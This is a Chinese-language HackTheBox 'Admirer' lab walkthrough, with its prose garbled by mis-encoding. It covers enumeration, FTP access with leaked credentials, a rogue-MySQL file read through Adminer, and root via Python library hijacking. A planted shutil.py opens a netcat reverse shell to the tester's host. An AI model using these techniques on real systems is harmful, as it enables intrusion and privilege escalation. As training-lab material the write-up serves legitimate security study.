http://www.pdsdt.lovepdsdt.com/index.php/2020/03/09/187/#Hackme","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHPååºåˆ—åŒ–","slug":"PHPååºåˆ—åŒ–","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"HTB::Admirer-walkthrough","date":"2020-05-21T13:09:53.000Z","path":"Target_drone/HackTheBox/17.HackTheBox-Admirer/","text":"HTB::Admirer Walkthrough æ–‡ç« é¦–å‘äº æ˜Ÿç›Ÿå®‰å…¨ å…¬ä¼—å· 0x01 Info Card 0x02 Tool and Tips nmap wfuzz adminer exploit python libaray path hijack 0x03 Pentesting Inital Enumeration ç«¯å£æ‰«æ 123456789101112131415161718192021$ nmap -Pn -A -T4 -p- 10.10.10.187Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-19 21:49 CESTNmap scan report for 10.10.10.187Host is up (0.014s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION21&#x2F;tcp open ftp vsftpd 3.0.322&#x2F;tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)| ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)| 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)|_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.25 ((Debian))| http-robots.txt: 1 disallowed entry |_&#x2F;admin-dir|_http-server-header: Apache&#x2F;2.4.25 (Debian)|_http-title: AdmirerService Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds FTPä¸å…è®¸åŒ¿åç™»å½• 1234567âœ admirer ftp admirer.htb Connected to admirer.htb.220 (vsFTPd 3.0.3)Name (admirer.htb:prashant): anonymous530 Permission denied.Login failed.ftp&gt; è®¿é—®10.10.10.187/admin-dirè¿”å›403 Forbiddenï¼Œç”¨wfuzzå·¥å…·æ‰«æç›®å½• 12345678910111213141516171819202122$ wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt -z list,txt-php-html -u http:&#x2F;&#x2F;10.10.10.187&#x2F;admin-dir&#x2F;FUZZ.FUZ2Z --hc 404,403 -t 100Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.********************************************************* Wfuzz 2.4.5 - The Web Fuzzer *********************************************************Target: http:&#x2F;&#x2F;10.10.10.187&#x2F;admin-dir&#x2F;FUZZ.FUZ2ZTotal requests: 61419&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;ID Response Lines Word Chars Payload&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;000015592: 200 29 L 39 W 350 Ch &quot;contacts - txt&quot;000016327: 200 11 L 13 W 136 Ch &quot;credentials - txt&quot;Total time: 247.8061Processed Requests: 61419Filtered Requests: 61417Requests&#x2F;sec.: 247.8509 contact.txt 123456789101112131415161718########### admins ############ PennyEmail: p.wise@admirer.htb############### developers ################ RajeshEmail: r.nayyar@admirer.htb# AmyEmail: a.bialik@admirer.htb# LeonardEmail: l.galecki@admirer.htb credential.txt 123456789101112131415[Bank Account]waldo.11Ezy]m27&#125;OREc$[Internal mail account]w.cooper@admirer.htbfgJr6q#S\\W:$P[FTP account]ftpuser%n?4Wz&#125;R$tTF7[Wordpress account]adminw0rdpr3ss01! ç”¨FTP accountç™»å½•FTPæœåŠ¡å™¨ï¼š 1234567891011121314ftp 10.10.10.187Connected to admirer.htb.220 (vsFTPd 3.0.3)Name (10.10.10.187:kali): ftpuser331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; lsdump.sqlhtml.tar.gzftp&gt; get dump.sqlftp&gt; get html.tar.gz dump.sql 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354-- MySQL dump 10.16 Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)---- Host: localhost Database: admirerdb-- -------------------------------------------------------- Server version 10.1.41-MariaDB-0+deb9u1&#x2F;*!40101 SET @OLD_CHARACTER_SET_CLIENT&#x3D;@@CHARACTER_SET_CLIENT *&#x2F;;&#x2F;*!40101 SET @OLD_CHARACTER_SET_RESULTS&#x3D;@@CHARACTER_SET_RESULTS *&#x2F;;&#x2F;*!40101 SET @OLD_COLLATION_CONNECTION&#x3D;@@COLLATION_CONNECTION *&#x2F;;&#x2F;*!40101 SET NAMES utf8mb4 *&#x2F;;&#x2F;*!40103 SET @OLD_TIME_ZONE&#x3D;@@TIME_ZONE *&#x2F;;&#x2F;*!40103 SET TIME_ZONE&#x3D;&#39;+00:00&#39; *&#x2F;;&#x2F;*!40014 SET @OLD_UNIQUE_CHECKS&#x3D;@@UNIQUE_CHECKS, UNIQUE_CHECKS&#x3D;0 *&#x2F;;&#x2F;*!40014 SET @OLD_FOREIGN_KEY_CHECKS&#x3D;@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS&#x3D;0 *&#x2F;;&#x2F;*!40101 SET @OLD_SQL_MODE&#x3D;@@SQL_MODE, SQL_MODE&#x3D;&#39;NO_AUTO_VALUE_ON_ZERO&#39; *&#x2F;;&#x2F;*!40111 SET @OLD_SQL_NOTES&#x3D;@@SQL_NOTES, SQL_NOTES&#x3D;0 *&#x2F;;---- Table structure for table &#96;items&#96;--DROP TABLE IF EXISTS &#96;items&#96;;&#x2F;*!40101 SET @saved_cs_client &#x3D; @@character_set_client *&#x2F;;&#x2F;*!40101 SET character_set_client &#x3D; utf8 *&#x2F;;CREATE TABLE &#96;items&#96; ( &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT, &#96;thumb_path&#96; text NOT NULL, &#96;image_path&#96; text NOT NULL, &#96;title&#96; text NOT NULL, &#96;text&#96; text, PRIMARY KEY (&#96;id&#96;)) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;13 DEFAULT CHARSET&#x3D;utf8mb4;&#x2F;*!40101 SET character_set_client &#x3D; @saved_cs_client *&#x2F;;---- Dumping data for table &#96;items&#96;--LOCK TABLES &#96;items&#96; WRITE;&#x2F;*!40000 ALTER TABLE &#96;items&#96; DISABLE KEYS *&#x2F;;INSERT INTO &#96;items&#96; VALUES (1,&#39;images&#x2F;thumbs&#x2F;thmb_art01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;art01.jpg&#39;,&#39;Visual Art&#39;,&#39;A pure showcase of skill and emotion.&#39;),(2,&#39;images&#x2F;thumbs&#x2F;thmb_eng02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;eng02.jpg&#39;,&#39;The Beauty and the Beast&#39;,&#39;Besides the technology, there is also the eye candy...&#39;),(3,&#39;images&#x2F;thumbs&#x2F;thmb_nat01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;nat01.jpg&#39;,&#39;The uncontrollable lightshow&#39;,&#39;When the sun decides to play at night.&#39;),(4,&#39;images&#x2F;thumbs&#x2F;thmb_arch02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;arch02.jpg&#39;,&#39;Nearly Monochromatic&#39;,&#39;One could simply spend hours looking at this indoor square.&#39;),(5,&#39;images&#x2F;thumbs&#x2F;thmb_mind01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mind01.jpg&#39;,&#39;Way ahead of his time&#39;,&#39;You probably still use some of his inventions... 500yrs later.&#39;),(6,&#39;images&#x2F;thumbs&#x2F;thmb_mus02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mus02.jpg&#39;,&#39;The outcomes of complexity&#39;,&#39;Seriously, listen to Dust in Interstellar\\&#39;s OST. Thank me later.&#39;),(7,&#39;images&#x2F;thumbs&#x2F;thmb_arch01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;arch01.jpg&#39;,&#39;Back to basics&#39;,&#39;And centuries later, we want to go back and live in nature... Sort of.&#39;),(8,&#39;images&#x2F;thumbs&#x2F;thmb_mind02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mind02.jpg&#39;,&#39;We need him back&#39;,&#39;He might have been a loner who allegedly slept with a pigeon, but that brain...&#39;),(9,&#39;images&#x2F;thumbs&#x2F;thmb_eng01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;eng01.jpg&#39;,&#39;In the name of Science&#39;,&#39;Some theories need to be proven.&#39;),(10,&#39;images&#x2F;thumbs&#x2F;thmb_mus01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mus01.jpg&#39;,&#39;Equal Temperament&#39;,&#39;Because without him, music would not exist (as we know it today).&#39;);&#x2F;*!40000 ALTER TABLE &#96;items&#96; ENABLE KEYS *&#x2F;;UNLOCK TABLES;&#x2F;*!40103 SET TIME_ZONE&#x3D;@OLD_TIME_ZONE *&#x2F;;&#x2F;*!40101 SET SQL_MODE&#x3D;@OLD_SQL_MODE *&#x2F;;&#x2F;*!40014 SET FOREIGN_KEY_CHECKS&#x3D;@OLD_FOREIGN_KEY_CHECKS *&#x2F;;&#x2F;*!40014 SET UNIQUE_CHECKS&#x3D;@OLD_UNIQUE_CHECKS *&#x2F;;&#x2F;*!40101 SET CHARACTER_SET_CLIENT&#x3D;@OLD_CHARACTER_SET_CLIENT *&#x2F;;&#x2F;*!40101 SET CHARACTER_SET_RESULTS&#x3D;@OLD_CHARACTER_SET_RESULTS *&#x2F;;&#x2F;*!40101 SET COLLATION_CONNECTION&#x3D;@OLD_COLLATION_CONNECTION *&#x2F;;&#x2F;*!40111 SET SQL_NOTES&#x3D;@OLD_SQL_NOTES *&#x2F;;-- Dump completed on 2019-12-02 20:24:15 è§£å‹html.tar.gz 123456789# kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html [12:51:51] $ ls -ltotal 28drwxr-x--- 6 kali kali 4096 6æœˆ 7 2019 assetsdrwxr-x--- 4 kali kali 4096 12æœˆ 3 04:29 images-rw-r----- 1 kali kali 4613 12æœˆ 4 04:20 index.php-rw-r----- 1 kali kali 134 12æœˆ 2 05:31 robots.txtdrwxr-x--- 2 kali kali 4096 12æœˆ 3 01:50 utility-scriptsdrwxr-x--- 2 kali kali 4096 12æœˆ 3 01:25 w4ld0s_s3cr3t_d1r utility-scriptsç›®å½•ä¸‹çš„æ–‡ä»¶ 123456789# kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html&#x2F;utility-scripts [12:53:54] $ ls -latotal 24drwxr-x--- 2 kali kali 4096 12æœˆ 3 01:50 .drwx------ 6 kali kali 4096 5æœˆ 20 14:29 ..-rw-r----- 1 kali kali 1795 12æœˆ 3 01:48 admin_tasks.php-rw-r----- 1 kali kali 401 12æœˆ 2 06:28 db_admin.php-rw-r----- 1 kali kali 20 11æœˆ 30 03:32 info.php-rw-r----- 1 kali kali 53 12æœˆ 3 01:40 phptest.php admin_tasks.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;html&gt;&lt;head&gt; &lt;title&gt;Administrative Tasks&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt; &lt;?php // Web Interface to the admin_tasks script // if(isset($_REQUEST[&#x27;task&#x27;])) &#123; $task = $_REQUEST[&#x27;task&#x27;]; if($task == &#x27;1&#x27; || $task == &#x27;2&#x27; || $task == &#x27;3&#x27; || $task == &#x27;4&#x27; || $task == &#x27;5&#x27; || $task == &#x27;6&#x27; || $task == &#x27;7&#x27;) &#123; /*********************************************************************************** Available options: 1) View system uptime 2) View logged in users 3) View crontab (current user only) 4) Backup passwd file (not working) 5) Backup shadow file (not working) 6) Backup web data (not working) 7) Backup database (not working) NOTE: Options 4-7 are currently NOT working because they need root privileges. I&#x27;m leaving them in the valid tasks in case I figure out a way to securely run code as root from a PHP page. ************************************************************************************/ echo str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, shell_exec(&quot;/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1&quot;)); &#125; else &#123; echo(&quot;Invalid task.&quot;); &#125; &#125; ?&gt; &lt;p&gt; &lt;h4&gt;Select task:&lt;/p&gt; &lt;form method=&quot;POST&quot;&gt; &lt;select name=&quot;task&quot;&gt; &lt;option value=1&gt;View system uptime&lt;/option&gt; &lt;option value=2&gt;View logged in users&lt;/option&gt; &lt;option value=3&gt;View crontab&lt;/option&gt; &lt;option value=4 disabled&gt;Backup passwd file&lt;/option&gt; &lt;option value=5 disabled&gt;Backup shadow file&lt;/option&gt; &lt;option value=6 disabled&gt;Backup web data&lt;/option&gt; &lt;option value=7 disabled&gt;Backup database&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; db_admin.php 1234567891011121314151617&lt;?php $servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;Wh3r3_1s_w4ld0?&quot;; // Create connection $conn = new mysqli($servername, $username, $password); // Check connection if ($conn-&gt;connect_error) &#123; die(&quot;Connection failed: &quot; . $conn-&gt;connect_error); &#125; echo &quot;Connected successfully&quot;; // TODO: Finish implementing this or find a better open source alternative?&gt; info.php 1&lt;?php phpinfo(); ?&gt; phptest.php 123&lt;?php echo(&quot;Just a test to see if PHP works.&quot;);?&gt; æš´éœ²äº†ä¸€ä¸ªæ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ä½†æ˜¯åé¢çš„æ³¨é‡Šæç¤ºa better open source alternativeï¼Œç”¨wfuzzæ‰«æè¯¥ç›®å½•ï¼š 123456789101112131415161718192021222324# kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html&#x2F;utility-scripts [12:53:55] $ wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt -z list,php-txt-html --hc 403,404 -t 100 -u http:&#x2F;&#x2F;10.10.10.187&#x2F;utility-scripts&#x2F;FUZZ.FUZ2ZWarning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.********************************************************* Wfuzz 2.4.5 - The Web Fuzzer *********************************************************Target: http:&#x2F;&#x2F;10.10.10.187&#x2F;utility-scripts&#x2F;FUZZ.FUZ2ZTotal requests: 61419&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;ID Response Lines Word Chars Payload&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;000005617: 200 51 L 235 W 4156 Ch &quot;adminer - php&quot;000028852: 200 964 L 4976 W 84023 Ch &quot;info - php&quot;000041602: 200 0 L 8 W 32 Ch &quot;phptest - php&quot;Total time: 266.5721Processed Requests: 61419Filtered Requests: 61416Requests&#x2F;sec.: 230.4028 è®¿é—®http://10.10.10.178/utility-scripts/adminer.php Getting User Access ç”¨ä¹‹å‰å¾—åˆ°çš„ç”¨æˆ·åå’Œå¯†ç å°è¯•ç™»å½•å¤±è´¥ï¼ŒGoogle Adminer database managerï¼Œå¾—åˆ°ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼š Serious Vulnerability Discovered in Adminer database Administration Tool ç®€å•æ¥è®²å°±æ˜¯ï¼Œå…ˆé…ç½®æœ¬åœ°çš„MySQLæ•°æ®åº“ï¼Œå…è®¸è¿œç¨‹è¿æ¥ç™»å½•ï¼Œç„¶åç”¨é¶æœºä¸Šçš„adminer database managerè¿æ¥æˆ‘ä»¬æœ¬åœ°çš„æ•°æ®åº“ï¼Œå†å°†é¶æœºçš„æ•æ„Ÿæ–‡ä»¶é€šè¿‡adminerå†™å…¥æ•°æ®åº“ï¼Œæœ€åä»æœ¬åœ°è¯»å–æ•æ„Ÿæ–‡ä»¶ã€‚ åœ¨kaliä¸Šç”¨rootç™»å½•MySQLï¼Œæ–°å»ºä¸€ä¸ªæ•°æ®åº“ï¼š 1MariaDB [(none)]&gt; CREATE DATABASE admirer; åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œå¦‚æœæƒ³è®©è¯¥ç”¨æˆ·å¯ä»¥ä»ä»»æ„è¿œç¨‹ä¸»æœºç™»é™†ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦% 1MariaDB [(none)]&gt; CREATE USER &#39;demo&#39;@&#39;%&#39; IDENTIFIED BY &#39;demo_admirer&#39;; ç»™æ–°ç”¨æˆ·æˆæƒï¼š 1MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON * . * TO &#x27;demo&#x27;@&#x27;%&#x27;; é‡æ–°åŠ è½½æƒé™ï¼š 1MariaDB [(none)]&gt; FLUSH PRIVILEGES; åˆ›å»ºæ–°æ•°æ®è¡¨testï¼š 1MariaDB [(admirer)]&gt; create table test(data VARCHAR(255)); é…ç½®æ•°æ®åº“ä½¿å¾—èƒ½è¿œç¨‹è¿æ¥ï¼Œä¿®æ”¹/etc/mysql/mariadb.conf.d/50-server.cnf 1bind-address &#x3D;0.0.0.0 é‡å¯MySQLæœåŠ¡ï¼š 1systemctl restart mysql åœ¨æœ¬åœ°éªŒè¯èƒ½å¦ç™»å½•ï¼š 1234567891011$ mysql -h localhost -u demo -pEnter password: Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 42Server version: 10.3.22-MariaDB-1 Debian buildd-unstableCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement.MariaDB [(none)]&gt; æˆåŠŸç™»å½•ï¼Œåœ¨admineré¡µé¢è¿œç¨‹ç™»å½•ï¼š It Workï¼ï¼ï¼ éªŒè¯èƒ½å¦ä½¿ç”¨load data infileè¯­å¥è¯»å–æ–‡ä»¶ï¼š 123load data local infile &#39;&#x2F;etc&#x2F;passwd&#39;into table testfields terminated by &quot;&#x2F;n&quot; çœ‹ä¸€ä¸‹phpinfo()ï¼š open_basediré™åˆ¶äº†æ ¹è·¯å¾„ï¼Œå°è¯•è¯»å–index.phpæ–‡ä»¶ï¼š è¯»å–æˆåŠŸï¼Œç”¨Selectè¯­å¥æ˜¾ç¤ºï¼š å¾—åˆ°waldo: &amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;å‡­è¯ç”¨æ¥ç™»å½•SSH 12345678910111213141516$ ssh waldo@10.10.10.187waldo@10.10.10.187&#39;s password: Linux admirer 4.9.0-12-amd64 x86_64 GNU&#x2F;LinuxThe programs included with the Devuan GNU&#x2F;Linux system are free software;the exact distribution terms for each program are described in theindividual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.Devuan GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.You have new mail.Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3waldo@admirer:~$ iduid&#x3D;1000(waldo) gid&#x3D;1000(waldo) groups&#x3D;1000(waldo),1001(admins)waldo@admirer:~$ cat user.txt 7222------------------------2c18 Getting Root Access æŸ¥çœ‹waldoèƒ½è¿è¡Œçš„è„šæœ¬æˆ–ç¨‹åº 1234567waldo@admirer:~$ sudo -l[sudo] password for waldo: Matching Defaults entries for waldo on admirer: env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=alwaysUser waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh admin_tasks.sh 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#!/bin/bashview_uptime()&#123; /usr/bin/uptime -p&#125;view_users()&#123; /usr/bin/w&#125;view_crontab()&#123; /usr/bin/crontab -l&#125;backup_passwd()&#123; if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot; /bin/cp /etc/passwd /var/backups/passwd.bak /bin/chown root:root /var/backups/passwd.bak /bin/chmod 600 /var/backups/passwd.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi&#125;backup_shadow()&#123; if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot; /bin/cp /etc/shadow /var/backups/shadow.bak /bin/chown root:shadow /var/backups/shadow.bak /bin/chmod 600 /var/backups/shadow.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi&#125;backup_web()&#123; if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running backup script in the background, it might take a while...&quot; /opt/scripts/backup.py &amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi&#125;backup_db()&#123; if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running mysqldump in the background, it may take a while...&quot; #/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp; /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi&#125;# Non-interactive way, to be used by the web interfaceif [ $# -eq 1 ]then option=$1 case $option in 1) view_uptime ;; 2) view_users ;; 3) view_crontab ;; 4) backup_passwd ;; 5) backup_shadow ;; 6) backup_web ;; 7) backup_db ;; *) echo &quot;Unknown option.&quot; &gt;&amp;2 esac exit 0fi# Interactive way, to be called from the command lineoptions=(&quot;View system uptime&quot; &quot;View logged in users&quot; &quot;View crontab&quot; &quot;Backup passwd file&quot; &quot;Backup shadow file&quot; &quot;Backup web data&quot; &quot;Backup DB&quot; &quot;Quit&quot;)echoecho &quot;[[[ System Administration Menu ]]]&quot;PS3=&quot;Choose an option: &quot;COLUMNS=11select opt in &quot;$&#123;options[@]&#125;&quot;; do case $REPLY in 1) view_uptime ; break ;; 2) view_users ; break ;; 3) view_crontab ; break ;; 4) backup_passwd ; break ;; 5) backup_shadow ; break ;; 6) backup_web ; break ;; 7) backup_db ; break ;; 8) echo &quot;Bye!&quot; ; break ;; *) echo &quot;Unknown option.&quot; &gt;&amp;2 esacdoneexit 0 åœ¨å‡ ä¸ªéœ€è¦rootæƒé™è¿è¡Œçš„å‡½æ•°ä¸­ï¼Œbackup_web()è°ƒç”¨äº†åŒç›®å½•ä¸‹çš„backup.pyè„šæœ¬æ–‡ä»¶ã€‚ backup.py 123456789101112#!/usr/bin/python3from shutil import make_archivesrc = &#x27;/var/www/html/&#x27;# old ftp directory, not used anymore#dst = &#x27;/srv/ftp/html&#x27;dst = &#x27;/var/backups/html&#x27;make_archive(dst, &#x27;gztar&#x27;, src) è¿™é‡Œå¼•ç”¨äº†shutilæ¨¡å—ä¸­çš„make_archiveå‡½æ•°ï¼Œè¿™ä¸ªåœ°æ–¹å¾—ç”¨Pythonåº“åŠ«æŒçš„æ–¹æ³•ææƒï¼š https://rastating.github.io/privilege-escalation-via-python-library-hijacking/ æŸ¥çœ‹å½“å‰Pythonåº“çš„è·¯å¾„ï¼š 12345678waldo@admirer:&#x2F;opt&#x2F;scripts$ python3 -c &#39;import sys; print (&quot;\\n&quot;.join(sys.path))&#39;&#x2F;usr&#x2F;lib&#x2F;python35.zip&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;plat-x86_64-linux-gnu&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;lib-dynload&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;dist-packages&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages ä½†æ˜¯æˆ‘ä»¬éƒ½æ²¡æœ‰æƒé™å†™å…¥æ–‡ä»¶åˆ°è¿™äº›è·¯å¾„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨PYTHONPATHæ¥ä¸´æ—¶æ›´æ”¹Pythonåº“çš„è·¯å¾„ é¦–å…ˆä¼ªé€ ä¸€ä¸ªshutil.pyåº“æ–‡ä»¶ 123456789waldo@admirer:&#x2F;opt&#x2F;scripts$ cdwaldo@admirer:~$ mkdir fakelibwaldo@admirer:~$ cd fakelib&#x2F;waldo@admirer:~&#x2F;fakelib$ nano shutil.py waldo@admirer:~&#x2F;fakelib$ cat shutil.py import osdef make_archive(a, b, c): os.system(&quot;nc 10.10.14.4 1234 -e &#39;&#x2F;bin&#x2F;sh&#39;&quot;) é¶æœºè¿è¡Œè„šæœ¬æ–‡ä»¶ 1234567891011121314waldo@admirer:~/fakelib$ sudo PYTHONPATH=~/fakelib /opt/scripts/admin_tasks.sh [sudo] password for waldo: [[[ System Administration Menu ]]]1) View system uptime2) View logged in users3) View crontab4) Backup passwd file5) Backup shadow file6) Backup web data7) Backup DB8) QuitChoose an option: 6Running backup script in the background, it might take a while... æœ¬æœºä¸Šç›‘å¬1234ç«¯å£ 123456789101112$ nc -lvnp 1234listening on [any] 1234 ...connect to [10.10.14.4] from (UNKNOWN) [10.10.10.187] 58946python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;root@admirer:&#x2F;home&#x2F;waldo&#x2F;fakelib# ididuid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)root@admirer:&#x2F;home&#x2F;waldo&#x2F;fakelib# cd cdroot@admirer:~# cat root.txtcat root.txtc6af------------------------4645 ROOTEDï¼ï¼ï¼ 0x04 Summary nmapæ‰«æå‡º admin-dirç›®å½•ï¼Œè®¿é—®å‘ç°403 Forbidden ä½¿ç”¨wfuzzå·¥å…·æ‰«æå‡º contacts.txt å’Œcredentials.txtä¸¤ä¸ªæ–‡ä»¶ ç”¨credentials.txtæ–‡ä»¶æš´éœ²å‡ºæ¥çš„FTPç”¨æˆ·åå’Œå¯†ç ç™»å½•é¶æœºFTPæœåŠ¡ 